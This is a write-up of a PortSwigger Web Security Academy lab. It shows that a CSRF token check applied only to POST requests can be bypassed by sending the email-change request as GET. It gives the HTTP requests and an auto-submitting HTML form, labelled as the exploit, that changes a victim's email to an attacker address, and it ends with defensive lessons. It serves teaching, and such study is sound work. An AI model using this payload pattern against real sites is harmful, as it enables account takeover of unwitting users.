# CSRF Where Token Validation Depends on Request Method

## Lab Description

This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability where the application validates the CSRF token for `POST` requests but fails to enforce the same protection when the request is changed to `GET`.

The goal is to exploit this behavior to change the victim's email address.

## Vulnerability

The application contains an email-change endpoint:

```text
/my-account/change-email
```

A normal email change is performed using a `POST` request and includes a CSRF token:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=example@gmail.com&csrf=<CSRF_TOKEN>
```

When the request is changed from `POST` to `GET`, the application fails to enforce the same CSRF protection.

## Steps to Reproduce

### 1. Log in to the Lab

Log in using the provided credentials and navigate to:

```text
/my-account
```

### 2. Capture the Email Change Request

Using Burp Suite, intercept the request generated when changing the email address.

The legitimate request looks similar to:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=example@gmail.com&csrf=<CSRF_TOKEN>
```

### 3. Test CSRF Protection

Send the request to Burp Repeater and remove or modify the CSRF token.

The application rejects the request when using the normal `POST` method.

This confirms that the `POST` request is protected by CSRF token validation.

### 4. Change POST to GET

Change the request method from:

```http
POST /my-account/change-email
```

to:

```http
GET /my-account/change-email
```

The request can then be constructed as:

```http
GET /my-account/change-email?email=attacker@gmail.com HTTP/2
Host: <LAB-ID>.web-security-academy.net
```

The application accepts the state-changing request through `GET`.

## Exploit

Create an HTML page that automatically submits the request:

```html
<html>
<body>

<form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>
```

## Exploit Server

Open the PortSwigger Exploit Server and create the exploit.

### Body

```html
<html>
<body>

<form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>
```

Click **Store** and then **Deliver exploit to victim**.

The victim's browser automatically submits the malicious `GET` request.

## Result

The victim's email address is changed to the attacker-controlled email address.

This confirms that the application's CSRF protection can be bypassed by changing the HTTP method from `POST` to `GET`.

## Why It Works

The application incorrectly relies on the HTTP method when deciding whether CSRF validation should be performed.

The protected flow is:

```text
POST request
     |
     v
CSRF token validation
     |
     v
Change email
```

The vulnerable flow is:

```text
GET request
     |
     v
No effective CSRF validation
     |
     v
Change email
```

Because `GET` requests can be triggered cross-site, an attacker can exploit the vulnerable endpoint using a malicious webpage.

## Key Learning

- CSRF protection must be applied consistently to all state-changing operations.
- State-changing actions should not be implemented using `GET`.
- HTTP methods should not be used as the only mechanism for deciding whether CSRF protection is required.
- Sensitive actions such as changing an email address should require a valid CSRF token.
- CSRF tokens should be validated server-side for state-changing requests.
- Applications should use appropriate non-safe HTTP methods such as `POST`, `PUT`, or `PATCH` for state-changing operations.

## Tools Used

- Burp Suite Community Edition
- Firefox
- PortSwigger Web Security Academy
- Burp Repeater
- PortSwigger Exploit Server

## Conclusion

The lab demonstrates a CSRF vulnerability caused by inconsistent CSRF token validation based on the HTTP request method.

Although the application protects the email-change functionality when using `POST`, it also allows the same state-changing operation through `GET` without equivalent CSRF protection. An attacker can therefore create a malicious HTML page that automatically sends a `GET` request and changes the victim's email address.
